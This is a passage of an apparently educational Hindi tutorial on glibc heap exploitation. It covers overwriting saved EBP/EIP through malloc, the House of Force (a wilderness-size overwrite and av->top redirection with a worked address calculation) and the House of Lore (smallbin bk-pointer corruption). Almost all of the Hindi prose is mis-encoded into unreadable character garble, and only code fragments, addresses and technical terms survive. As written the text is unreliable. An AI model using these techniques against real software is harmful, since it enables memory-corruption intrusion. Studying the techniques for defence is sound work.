‡§Ø‡§¶‡§ø ‡§Ø‡§π ‡§™‡•Ç‡§∞‡§æ ‡§π‡•ã‡§§‡§æ ‡§π‡•à, ‡§§‡•ã ‡§ú‡§¨ ‡§π‡§Æ ‡§Ö‡§ó‡§≤‡•á malloc ‡§ï‡•ã ‡§ï‡•â‡§≤ ‡§ï‡§∞‡§§‡•á ‡§π‡•à‡§Ç, ‡§ú‡§ø‡§∏‡•á ‡§π‡§Æ‡§®‡•á ‡§ï‡§π‡§æ ‡§•‡§æ ‡§ï‡§ø ‡§Ø‡§π malloc(40) ‡§•‡§æ, ‡§§‡•ã ‡§á‡§∏‡•á EBP ‡§ï‡•á ‡§™‡§§‡•á ‡§ï‡•á ‡§∞‡•Ç‡§™ ‡§Æ‡•á‡§Ç ‡§Ö‡§∏‡§æ‡§á‡§® ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§è‡§ó‡§æ‡•§ ‡§Ø‡§¶‡§ø ‡§π‡§Æ‡§≤‡§æ‡§µ‡§∞ ‡§Ø‡§π ‡§≠‡•Ä ‡§®‡§ø‡§Ø‡§Ç‡§§‡•ç‡§∞‡§ø‡§§ ‡§ï‡§∞ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à ‡§ï‡§ø ‡§á‡§∏ malloc ‡§Æ‡•á‡§Ç ‡§ï‡•ç‡§Ø‡§æ ‡§≤‡§ø‡§ñ‡§æ ‡§ó‡§Ø‡§æ ‡§π‡•à, ‡§§‡•ã ‡§µ‡§π EBP ‡§î‡§∞ EIP ‡§¶‡•ã‡§®‡•ã‡§Ç ‡§ï‡•ã ‡§â‡§∏ ‡§™‡§§‡•á ‡§∏‡•á ‡§ì‡§µ‡§∞‡§∞‡§æ‡§á‡§ü ‡§ï‡§∞ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à ‡§ú‡•ã ‡§µ‡§π ‡§ö‡§æ‡§π‡§§‡§æ ‡§π‡•à‡•§

‡§Æ‡•Å‡§ù‡•á ‡§≤‡§ó‡§§‡§æ ‡§π‡•à ‡§ï‡§ø ‡§ê‡§∏‡§æ ‡§á‡§∏‡§≤‡§ø‡§è ‡§π‡•à ‡§ï‡•ç‡§Ø‡•ã‡§Ç‡§ï‡§ø ‡§ú‡§¨ ‡§á‡§∏‡•á ‡§Æ‡•Å‡§ï‡•ç‡§§ ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§è‡§ó‡§æ, ‡§§‡•ã free() ‡§Ø‡§π ‡§∞‡§ñ‡•á‡§ó‡§æ ‡§ï‡§ø ‡§∏‡•ç‡§ü‡•à‡§ï ‡§ï‡•á EBP ‡§ï‡•ã ‡§á‡§Ç‡§ó‡§ø‡§§ ‡§ï‡§∞‡§®‡•á ‡§µ‡§æ‡§≤‡•á ‡§™‡§§‡•á ‡§™‡§∞ ‡§è‡§ï ‡§ü‡•Å‡§ï‡§°‡§º‡§æ ‡§π‡•à ‡§ú‡•ã ‡§®‡§è malloc() ‡§ï‡•á ‡§≤‡§ø‡§è ‡§Ü‡§∞‡§ï‡•ç‡§∑‡§ø‡§§ ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§è‡§ï‡§¶‡§Æ ‡§∏‡§π‡•Ä ‡§Ü‡§ï‡§æ‡§∞ ‡§π‡•à, ‡§á‡§∏‡§≤‡§ø‡§è ‡§á‡§∏‡•á ‡§â‡§∏ ‡§™‡§§‡•á ‡§ï‡•ã ‡§Ö‡§∏‡§æ‡§á‡§® ‡§ï‡§∞‡§§‡§æ ‡§π‡•à‡•§

**‡§¶ ‡§π‡§æ‡§â‡§∏ ‡§ë‡§´ ‡§´‡•ã‡§∞‡•ç‡§∏**

‡§Ü‡§µ‡§∂‡•ç‡§Ø‡§ï ‡§π‡•à:

* ‡§è‡§ï ‡§ü‡•Å‡§ï‡§°‡§º‡•á ‡§™‡§∞ ‡§ì‡§µ‡§∞‡§´‡•ç‡§≤‡•ã ‡§ú‡•ã ‡§µ‡§æ‡§á‡§≤‡•ç‡§°‡§∞‡§®‡•á‡§∏ ‡§ï‡•ã ‡§ì‡§µ‡§∞‡§∞‡§æ‡§á‡§ü ‡§ï‡§∞‡§®‡•á ‡§ï‡•Ä ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§¶‡•á‡§§‡§æ ‡§π‡•à‡•§
* ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ ‡§¶‡•ç‡§µ‡§æ‡§∞‡§æ ‡§™‡§∞‡§ø‡§≠‡§æ‡§∑‡§ø‡§§ ‡§Ü‡§ï‡§æ‡§∞ ‡§ï‡•á ‡§∏‡§æ‡§• malloc() ‡§ï‡•ã ‡§ï‡•â‡§≤ ‡§ï‡§∞‡§®‡§æ‡•§
* ‡§è‡§ï malloc() ‡§ï‡•ã ‡§ï‡•â‡§≤ ‡§ï‡§∞‡§®‡§æ ‡§ú‡§ø‡§∏‡§ï‡•á ‡§°‡•á‡§ü‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ ‡§¶‡•ç‡§µ‡§æ‡§∞‡§æ ‡§™‡§∞‡§ø‡§≠‡§æ‡§∑‡§ø‡§§ ‡§ï‡§ø‡§è ‡§ú‡§æ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç‡•§

‡§™‡§π‡§≤‡•Ä ‡§¨‡§æ‡§§ ‡§Ø‡§π ‡§π‡•à ‡§ï‡§ø ‡§µ‡§æ‡§á‡§≤‡•ç‡§°‡§∞‡§®‡•á‡§∏ ‡§ï‡•á ‡§ü‡•Å‡§ï‡§°‡§º‡•á ‡§ï‡•á ‡§Ü‡§ï‡§æ‡§∞ ‡§ï‡•ã ‡§è‡§ï ‡§¨‡§π‡•Å‡§§ ‡§¨‡§°‡§º‡•á ‡§Æ‡§æ‡§® (0xffffffff) ‡§ï‡•á ‡§∏‡§æ‡§• ‡§ì‡§µ‡§∞‡§∞‡§æ‡§á‡§ü ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§§‡§æ ‡§π‡•à, ‡§§‡§æ‡§ï‡§ø ‡§ï‡•ã‡§à ‡§≠‡•Ä ‡§™‡§∞‡•ç‡§Ø‡§æ‡§™‡•ç‡§§ ‡§¨‡§°‡§º‡§æ ‡§Æ‡•á‡§Æ‡•ã‡§∞‡•Ä ‡§Ö‡§®‡•Å‡§∞‡•ã‡§ß \_int\_malloc() ‡§Æ‡•á‡§Ç ‡§¨‡§ø‡§®‡§æ ‡§π‡•Ä‡§™ ‡§ï‡§æ ‡§µ‡§ø‡§∏‡•ç‡§§‡§æ‡§∞ ‡§ï‡§ø‡§è ‡§∏‡§Ç‡§∏‡§æ‡§ß‡§ø‡§§ ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§è‡•§

‡§¶‡•Ç‡§∏‡§∞‡•Ä ‡§¨‡§æ‡§§ ‡§Ø‡§π ‡§π‡•à ‡§ï‡§ø av->top ‡§ï‡•ã ‡§è‡§ï ‡§ê‡§∏‡•á ‡§Æ‡•á‡§Æ‡•ã‡§∞‡•Ä ‡§ï‡•ç‡§∑‡•á‡§§‡•ç‡§∞ ‡§ï‡•Ä ‡§ì‡§∞ ‡§á‡§Ç‡§ó‡§ø‡§§ ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§∏‡§Ç‡§∂‡•ã‡§ß‡§ø‡§§ ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§§‡§æ ‡§π‡•à ‡§ú‡•ã ‡§π‡§Æ‡§≤‡§æ‡§µ‡§∞ ‡§ï‡•á ‡§®‡§ø‡§Ø‡§Ç‡§§‡•ç‡§∞‡§£ ‡§Æ‡•á‡§Ç ‡§π‡•à, ‡§ú‡•à‡§∏‡•á ‡§ï‡§ø ‡§∏‡•ç‡§ü‡•à‡§ï‡•§ av->top ‡§Æ‡•á‡§Ç \&EIP - 8 ‡§∞‡§ñ‡§æ ‡§ú‡§æ‡§è‡§ó‡§æ‡•§

‡§π‡§Æ‡•á‡§Ç av->top ‡§ï‡•ã ‡§â‡§∏ ‡§Æ‡•á‡§Æ‡•ã‡§∞‡•Ä ‡§ï‡•ç‡§∑‡•á‡§§‡•ç‡§∞ ‡§ï‡•Ä ‡§ì‡§∞ ‡§á‡§Ç‡§ó‡§ø‡§§ ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§ì‡§µ‡§∞‡§∞‡§æ‡§á‡§ü ‡§ï‡§∞‡§®‡§æ ‡§π‡•ã‡§ó‡§æ ‡§ú‡•ã ‡§π‡§Æ‡§≤‡§æ‡§µ‡§∞ ‡§ï‡•á ‡§®‡§ø‡§Ø‡§Ç‡§§‡•ç‡§∞‡§£ ‡§Æ‡•á‡§Ç ‡§π‡•à:

victim = av->top;

remainder = chunck\_at\_offset(victim, nb);

av->top = remainder;

Victim ‡§µ‡§∞‡•ç‡§§‡§Æ‡§æ‡§® ‡§µ‡§æ‡§á‡§≤‡•ç‡§°‡§∞‡§®‡•á‡§∏ ‡§ü‡•Å‡§ï‡§°‡§º‡•á ‡§ï‡•á ‡§™‡§§‡•á ‡§ï‡§æ ‡§Æ‡§æ‡§® ‡§∞‡§ñ‡§§‡§æ ‡§π‡•à (‡§µ‡§∞‡•ç‡§§‡§Æ‡§æ‡§® av->top) ‡§î‡§∞ remainder ‡§â‡§∏ ‡§™‡§§‡•á ‡§ï‡§æ ‡§Ø‡•ã‡§ó ‡§π‡•à ‡§ú‡•ã malloc() ‡§¶‡•ç‡§µ‡§æ‡§∞‡§æ ‡§Ö‡§®‡•Å‡§∞‡•ã‡§ß‡§ø‡§§ ‡§¨‡§æ‡§á‡§ü‡•ç‡§∏ ‡§ï‡•Ä ‡§Æ‡§æ‡§§‡•ç‡§∞‡§æ ‡§π‡•à‡•§ ‡§á‡§∏‡§≤‡§ø‡§è ‡§Ø‡§¶‡§ø \&EIP-8 0xbffff224 ‡§™‡§∞ ‡§π‡•à ‡§î‡§∞ av->top 0x080c2788 ‡§π‡•à, ‡§§‡•ã ‡§Ö‡§ó‡§≤‡•Ä malloc() ‡§ï‡•á ‡§≤‡§ø‡§è av->top ‡§ï‡•ã $EIP-8 ‡§ï‡•Ä ‡§ì‡§∞ ‡§á‡§Ç‡§ó‡§ø‡§§ ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§π‡§Æ‡•á‡§Ç malloc ‡§Æ‡•á‡§Ç ‡§Ö‡§®‡•Å‡§∞‡•ã‡§ß‡§ø‡§§ ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§π‡§Æ‡•á‡§Ç ‡§Ü‡§∞‡§ï‡•ç‡§∑‡§ø‡§§ ‡§ï‡§∞‡§®‡•á ‡§ï‡•Ä ‡§Æ‡§æ‡§§‡•ç‡§∞‡§æ ‡§π‡•ã‡§ó‡•Ä:

0xbffff224 - 0x080c2788 = 3086207644‡•§

‡§á‡§∏ ‡§™‡•ç‡§∞‡§ï‡§æ‡§∞, av->top ‡§Æ‡•á‡§Ç ‡§∏‡§Ç‡§∂‡•ã‡§ß‡§ø‡§§ ‡§Æ‡§æ‡§® ‡§∞‡§ñ‡§æ ‡§ú‡§æ‡§è‡§ó‡§æ ‡§î‡§∞ ‡§Ö‡§ó‡§≤‡•Ä malloc EIP ‡§ï‡•Ä ‡§ì‡§∞ ‡§á‡§∂‡§æ‡§∞‡§æ ‡§ï‡§∞‡•á‡§ó‡§æ ‡§î‡§∞ ‡§á‡§∏‡•á ‡§ì‡§µ‡§∞‡§∞‡§æ‡§á‡§ü ‡§ï‡§∞ ‡§∏‡§ï‡•á‡§ó‡§æ‡•§

‡§Ø‡§π ‡§ú‡§æ‡§®‡§®‡§æ ‡§Æ‡§π‡§§‡•ç‡§µ‡§™‡•Ç‡§∞‡•ç‡§£ ‡§π‡•à ‡§ï‡§ø ‡§®‡§è ‡§µ‡§æ‡§á‡§≤‡•ç‡§°‡§∞‡§®‡•á‡§∏ ‡§ü‡•Å‡§ï‡§°‡§º‡•á ‡§ï‡§æ ‡§Ü‡§ï‡§æ‡§∞ ‡§™‡§ø‡§õ‡§≤‡•á malloc() ‡§¶‡•ç‡§µ‡§æ‡§∞‡§æ ‡§ï‡§ø‡§è ‡§ó‡§è ‡§Ö‡§®‡•Å‡§∞‡•ã‡§ß ‡§∏‡•á ‡§¨‡§°‡§º‡§æ ‡§π‡•ã‡§®‡§æ ‡§ö‡§æ‡§π‡§ø‡§è‡•§ ‡§Ö‡§∞‡•ç‡§•‡§æ‡§§‡•ç, ‡§Ø‡§¶‡§ø ‡§µ‡§æ‡§á‡§≤‡•ç‡§°‡§∞‡§®‡•á‡§∏ \&EIP-8 ‡§ï‡•Ä ‡§ì‡§∞ ‡§á‡§∂‡§æ‡§∞‡§æ ‡§ï‡§∞ ‡§∞‡§π‡§æ ‡§π‡•à, ‡§§‡•ã ‡§Ü‡§ï‡§æ‡§∞ ‡§∏‡•ç‡§ü‡•à‡§ï ‡§ï‡•á EBP ‡§´‡§º‡•Ä‡§≤‡•ç‡§° ‡§Æ‡•á‡§Ç ‡§†‡•Ä‡§ï ‡§∞‡§π‡•á‡§ó‡§æ‡•§

**‡§¶ ‡§π‡§æ‡§â‡§∏ ‡§ë‡§´ ‡§≤‡•â‡§∞**

**SmallBin ‡§ï‡§æ ‡§≠‡•ç‡§∞‡§∑‡•ç‡§ü‡§æ‡§ö‡§æ‡§∞**

‡§Æ‡•Å‡§ï‡•ç‡§§ ‡§ï‡§ø‡§è ‡§ó‡§è ‡§ü‡•Å‡§ï‡§°‡§º‡•á ‡§â‡§®‡§ï‡•á ‡§Ü‡§ï‡§æ‡§∞ ‡§ï‡•á ‡§Ü‡§ß‡§æ‡§∞ ‡§™‡§∞ ‡§¨‡§ø‡§® ‡§Æ‡•á‡§Ç ‡§°‡§æ‡§≤‡•á ‡§ú‡§æ‡§§‡•á ‡§π‡•à‡§Ç‡•§ ‡§≤‡•á‡§ï‡§ø‡§® ‡§â‡§®‡•ç‡§π‡•á‡§Ç ‡§°‡§æ‡§≤‡§®‡•á ‡§∏‡•á ‡§™‡§π‡§≤‡•á ‡§â‡§®‡•ç‡§π‡•á‡§Ç ‡§Ö‡§®‡§∏‡•â‡§∞‡•ç‡§ü‡•á‡§° ‡§¨‡§ø‡§® ‡§Æ‡•á‡§Ç ‡§∞‡§ñ‡§æ ‡§ú‡§æ‡§§‡§æ ‡§π‡•à‡•§ ‡§è‡§ï ‡§ü‡•Å‡§ï‡§°‡§º‡§æ ‡§Æ‡•Å‡§ï‡•ç‡§§ ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§§‡§æ ‡§π‡•à, ‡§á‡§∏‡•á ‡§§‡•Å‡§∞‡§Ç‡§§ ‡§â‡§∏‡§ï‡•á ‡§¨‡§ø‡§® ‡§Æ‡•á‡§Ç ‡§®‡§π‡•Ä‡§Ç ‡§°‡§æ‡§≤‡§æ ‡§ú‡§æ‡§§‡§æ ‡§π‡•à ‡§¨‡§≤‡•ç‡§ï‡§ø ‡§á‡§∏‡•á ‡§Ö‡§®‡§∏‡•â‡§∞‡•ç‡§ü‡•á‡§° ‡§¨‡§ø‡§® ‡§Æ‡•á‡§Ç ‡§∞‡§ñ‡§æ ‡§ú‡§æ‡§§‡§æ ‡§π‡•à‡•§ ‡§á‡§∏‡§ï‡•á ‡§¨‡§æ‡§¶, ‡§Ø‡§¶‡§ø ‡§è‡§ï ‡§®‡§Ø‡§æ ‡§ü‡•Å‡§ï‡§°‡§º‡§æ ‡§Ü‡§∞‡§ï‡•ç‡§∑‡§ø‡§§ ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§§‡§æ ‡§π‡•à ‡§î‡§∞ ‡§™‡§ø‡§õ‡§≤‡•á ‡§Æ‡•Å‡§ï‡•ç‡§§ ‡§ï‡§ø‡§è ‡§ó‡§è ‡§ü‡•Å‡§ï‡§°‡§º‡•á ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à, ‡§§‡•ã ‡§á‡§∏‡•á ‡§µ‡§æ‡§™‡§∏ ‡§ï‡§∞ ‡§¶‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§§‡§æ ‡§π‡•à, ‡§≤‡•á‡§ï‡§ø‡§® ‡§Ø‡§¶‡§ø ‡§è‡§ï ‡§¨‡§°‡§º‡§æ ‡§Ü‡§∞‡§ï‡•ç‡§∑‡§ø‡§§ ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§§‡§æ ‡§π‡•à, ‡§§‡•ã ‡§Ö‡§®‡§∏‡•â‡§∞‡•ç‡§ü‡•á‡§° ‡§¨‡§ø‡§® ‡§Æ‡•á‡§Ç ‡§Æ‡•Å‡§ï‡•ç‡§§ ‡§ï‡§ø‡§Ø‡§æ ‡§ó‡§Ø‡§æ ‡§ü‡•Å‡§ï‡§°‡§º‡§æ ‡§â‡§∏‡§ï‡•á ‡§â‡§ö‡§ø‡§§ ‡§¨‡§ø‡§® ‡§Æ‡•á‡§Ç ‡§°‡§æ‡§≤ ‡§¶‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§§‡§æ ‡§π‡•à‡•§

‡§ï‡§Æ‡§ú‡•ã‡§∞ ‡§ï‡•ã‡§° ‡§§‡§ï ‡§™‡§π‡•Å‡§Å‡§ö‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§Æ‡•á‡§Æ‡•ã‡§∞‡•Ä ‡§Ö‡§®‡•Å‡§∞‡•ã‡§ß av->max\_fast (72 ‡§∏‡§æ‡§Æ‡§æ‡§®‡•ç‡§Ø‡§§‡§É) ‡§∏‡•á ‡§¨‡§°‡§º‡§æ ‡§î‡§∞ MIN\_LARGE\_SIZE (512) ‡§∏‡•á ‡§ï‡§Æ ‡§π‡•ã‡§®‡§æ ‡§ö‡§æ‡§π‡§ø‡§è‡•§

‡§Ø‡§¶‡§ø ‡§¨‡§ø‡§® ‡§Æ‡•á‡§Ç ‡§Ö‡§®‡•Å‡§∞‡•ã‡§ß ‡§ï‡•á ‡§≤‡§ø‡§è ‡§â‡§™‡§Ø‡•Å‡§ï‡•ç‡§§ ‡§Ü‡§ï‡§æ‡§∞ ‡§ï‡§æ ‡§è‡§ï ‡§ü‡•Å‡§ï‡§°‡§º‡§æ ‡§π‡•à, ‡§§‡•ã ‡§á‡§∏‡•á ‡§Ö‡§®‡§≤‡§ø‡§Ç‡§ï ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§¨‡§æ‡§¶ ‡§µ‡§æ‡§™‡§∏ ‡§ï‡§∞ ‡§¶‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§§‡§æ ‡§π‡•à:

bck = victim->bk; ‡§™‡§ø‡§õ‡§≤‡•á ‡§ü‡•Å‡§ï‡§°‡§º‡•á ‡§ï‡•Ä ‡§ì‡§∞ ‡§á‡§∂‡§æ‡§∞‡§æ ‡§ï‡§∞‡§§‡§æ ‡§π‡•à, ‡§Ø‡§π ‡§è‡§ï‡§Æ‡§æ‡§§‡•ç‡§∞ ‡§ú‡§æ‡§®‡§ï‡§æ‡§∞‡•Ä ‡§π‡•à ‡§ú‡§ø‡§∏‡•á ‡§π‡§Æ ‡§∏‡§Ç‡§∂‡•ã‡§ß‡§ø‡§§ ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç‡•§

bin->bk = bck; ‡§™‡•Ç‡§∞‡•ç‡§µ‡§µ‡§∞‡•ç‡§§‡•Ä ‡§ü‡•Å‡§ï‡§°‡§º‡§æ ‡§Ö‡§Ç‡§§‡§ø‡§Æ ‡§¨‡§® ‡§ú‡§æ‡§§‡§æ ‡§π‡•à, ‡§Ø‡§¶‡§ø bck ‡§∏‡•ç‡§ü‡•à‡§ï ‡§ï‡•Ä ‡§ì‡§∞ ‡§á‡§∂‡§æ‡§∞‡§æ ‡§ï‡§∞‡§§‡§æ ‡§π‡•à, ‡§§‡•ã ‡§Ö‡§ó‡§≤‡•á ‡§Ü‡§∞‡§ï‡•ç‡§∑‡§ø‡§§ ‡§ü‡•Å‡§ï‡§°‡§º‡•á ‡§ï‡•ã ‡§Ø‡§π ‡§™‡§§‡§æ ‡§¶‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§è‡§ó‡§æ‡•§

bck->fd = bin; ‡§Ø‡§π ‡§∏‡•Ç‡§ö‡•Ä ‡§ï‡•ã ‡§¨‡§Ç‡§¶ ‡§ï‡§∞ ‡§¶‡•á‡§§‡§æ ‡§π‡•à ‡§§‡§æ‡§ï‡§ø ‡§Ø‡§π ‡§¨‡§ø‡§® ‡§ï‡•Ä ‡§ì‡§∞ ‡§á‡§∂‡§æ‡§∞‡§æ ‡§ï‡§∞‡•á‡•§

‡§Ü‡§µ‡§∂‡•ç‡§Ø‡§ï ‡§π‡•à:

‡§¶‡•ã malloc ‡§Ü‡§∞‡§ï‡•ç‡§∑‡§ø‡§§ ‡§ï‡§∞‡§®‡§æ, ‡§§‡§æ‡§ï‡§ø ‡§™‡§π‡§≤‡•á ‡§ï‡•ã ‡§ì‡§µ‡§∞‡§´‡•ç‡§≤‡•ã ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ ‡§∏‡§ï‡•á, ‡§á‡§∏‡§ï‡•á ‡§¨‡§æ‡§¶ ‡§¶‡•Ç‡§∏‡§∞‡•á ‡§ï‡•ã ‡§Æ‡•Å‡§ï‡•ç‡§§ ‡§ï‡§ø‡§Ø‡§æ ‡§ó‡§Ø‡§æ ‡§π‡•ã ‡§î‡§∞ ‡§á‡§∏‡•á ‡§â‡§∏‡§ï‡•á ‡§¨‡§ø‡§® ‡§Æ‡•á‡§Ç ‡§°‡§æ‡§≤‡§æ ‡§ó‡§Ø‡§æ ‡§π‡•ã (‡§Ö‡§∞‡•ç‡§•‡§æ‡§§, ‡§¶‡•Ç‡§∏‡§∞‡•á ‡§ü‡•Å‡§ï‡§°‡§º‡•á ‡§∏‡•á ‡§™‡§π‡§≤‡•á ‡§è‡§ï ‡§¨‡§°‡§º‡§æ malloc ‡§Ü‡§∞‡§ï‡•ç‡§∑‡§ø‡§§ ‡§ï‡§ø‡§Ø‡§æ ‡§ó‡§Ø‡§æ ‡§π‡•ã)‡•§

‡§ú‡§ø‡§∏ malloc ‡§ï‡•ã ‡§π‡§Æ‡§≤‡§æ‡§µ‡§∞ ‡§¶‡•ç‡§µ‡§æ‡§∞‡§æ ‡§ö‡•Å‡§®‡•á ‡§ó‡§è ‡§™‡§§‡•á ‡§ï‡•ã ‡§¶‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§§‡§æ ‡§π‡•à, ‡§â‡§∏‡•á ‡§π‡§Æ‡§≤‡§æ‡§µ‡§∞ ‡§¶‡•ç‡§µ‡§æ‡§∞‡§æ ‡§®‡§ø‡§Ø‡§Ç‡§§‡•ç‡§∞‡§ø‡§§ ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§®‡§æ ‡§ö‡§æ‡§π‡§ø‡§è‡•§

‡§≤‡§ï‡•ç‡§∑‡•ç‡§Ø ‡§®‡§ø‡§Æ‡•ç‡§®‡§≤‡§ø‡§ñ‡§ø‡§§ ‡§π‡•à, ‡§Ø‡§¶‡§ø ‡§π‡§Æ ‡§è‡§ï ‡§ê‡§∏‡•á ‡§π‡•Ä‡§™ ‡§™‡§∞ ‡§ì‡§µ‡§∞‡§´‡•ç‡§≤‡•ã ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç ‡§ú‡§ø‡§∏‡§ï‡•á ‡§®‡•Ä‡§ö‡•á ‡§è‡§ï ‡§™‡§π‡§≤‡•á ‡§∏‡•á ‡§Æ‡•Å‡§ï‡•ç‡§§ ‡§ï‡§ø‡§Ø‡§æ ‡§ó‡§Ø‡§æ ‡§ü‡•Å‡§ï‡§°‡§º‡§æ ‡§π‡•à ‡§î‡§∞ ‡§â‡§∏‡§ï‡•á ‡§¨‡§ø‡§® ‡§Æ‡•á‡§Ç ‡§π‡•à, ‡§§‡•ã ‡§π‡§Æ ‡§â‡§∏‡§ï‡•á bk ‡§™‡•â‡§á‡§Ç‡§ü‡§∞ ‡§ï‡•ã ‡§∏‡§Ç‡§∂‡•ã‡§ß‡§ø‡§§ ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç‡•§ ‡§Ø‡§¶‡§ø ‡§π‡§Æ ‡§â‡§∏‡§ï‡•á bk ‡§™‡•â‡§á‡§Ç‡§ü‡§∞ ‡§ï‡•ã ‡§∏‡§Ç‡§∂‡•ã‡§ß‡§ø‡§§ ‡§ï‡§∞‡§§‡•á ‡§π‡•à‡§Ç ‡§î‡§∞ ‡§Ø‡§π ‡§ü‡•Å‡§ï‡§°‡§º‡§æ ‡§∏‡•Ç‡§ö‡•Ä ‡§ï‡§æ ‡§™‡§π‡§≤‡§æ ‡§¨‡§® ‡§ú‡§æ‡§§‡§æ ‡§π‡•à ‡§î‡§∞ ‡§Ü‡§∞‡§ï‡•ç‡§∑‡§ø‡§§ ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§§‡§æ ‡§π‡•à, ‡§§‡•ã ‡§¨‡§ø‡§® ‡§ï‡•ã ‡§ß‡•ã‡§ñ‡§æ ‡§¶‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§è‡§ó‡§æ ‡§î‡§∞ ‡§â‡§∏‡•á ‡§¨‡§§‡§æ‡§Ø‡§æ ‡§ú‡§æ‡§è‡§ó‡§æ ‡§ï‡§ø ‡§∏‡•Ç‡§ö‡•Ä ‡§ï‡§æ ‡§Ö‡§Ç‡§§‡§ø‡§Æ ‡§ü‡•Å‡§ï‡§°‡§º‡§æ (‡§Ö‡§ó‡§≤‡§æ ‡§ú‡•ã ‡§™‡•á‡§∂ ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§è‡§ó‡§æ) ‡§â‡§∏ ‡§ù‡•Ç‡§†‡•á ‡§™‡§§‡•á ‡§™‡§∞ ‡§π‡•à ‡§ú‡§ø‡§∏‡•á ‡§π‡§Æ‡§®‡•á ‡§∞‡§ñ‡§æ ‡§π‡•à (‡§∏‡•ç‡§ü‡•à‡§ï ‡§Ø‡§æ GOT ‡§ï‡•á ‡§∞‡•Ç‡§™ ‡§Æ‡•á‡§Ç)‡•§ ‡§á‡§∏‡§≤‡§ø‡§è ‡§Ø‡§¶‡§ø ‡§è‡§ï ‡§î‡§∞ ‡§ü‡•Å‡§ï‡§°‡§º‡§æ ‡§´‡§ø‡§∞ ‡§∏‡•á ‡§Ü‡§∞‡§ï‡•ç‡§∑‡§ø‡§§ ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§§‡§æ ‡§π‡•à ‡§î‡§∞ ‡§π‡§Æ‡§≤‡§æ‡§µ‡§∞ ‡§ï‡•ã ‡§â‡§∏ ‡§™‡§∞ ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§π‡•à, ‡§§‡•ã ‡§â‡§∏‡•á ‡§â‡§∏ ‡§∏‡•ç‡§•‡§ø‡§§‡§ø ‡§Æ‡•á‡§Ç ‡§è‡§ï ‡§ü‡•Å‡§ï‡§°‡§º‡§æ ‡§¶‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§è‡§ó‡§æ ‡§î‡§∞ ‡§µ‡§π ‡§â‡§∏ ‡§™‡§∞ ‡§≤‡§ø‡§ñ ‡§∏‡§ï‡•á‡§ó‡§æ‡•§

‡§∏‡§Ç‡§∂‡•ã‡§ß‡§ø‡§§ ‡§ü‡•Å‡§ï‡§°‡§º‡•á ‡§ï‡•ã ‡§Æ‡•Å‡§ï‡•ç‡§§ ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§¨‡§æ‡§¶, ‡§Ø‡§π ‡§Ü‡§µ‡§∂‡•ç‡§Ø‡§ï ‡§π‡•à ‡§ï‡§ø ‡§è‡§ï ‡§¨‡§°‡§º‡•á ‡§ü‡•Å‡§ï‡§°‡§º‡•á ‡§ï‡•ã ‡§Ü‡§∞‡§ï‡•ç‡§∑‡§ø‡§§ ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§è, ‡§§‡§æ‡§ï‡§ø ‡§∏‡§Ç‡§∂‡•ã‡§ß‡§ø‡§§ ‡§ü‡•Å‡§ï‡§°‡§º‡§æ ‡§Ö‡§®‡§∏‡•â‡§∞‡•ç‡§ü‡•á‡§° ‡§¨‡§ø‡§® ‡§∏‡•á ‡§¨‡§æ‡§π‡§∞ ‡§®‡§ø‡§ï‡§≤ ‡§ú‡§æ‡§è ‡§î‡§∞ ‡§Ö‡§™‡§®‡•á ‡§¨‡§ø‡§® ‡§Æ‡•á‡§Ç ‡§°‡§æ‡§≤‡§æ ‡§ú‡§æ‡§è‡•§

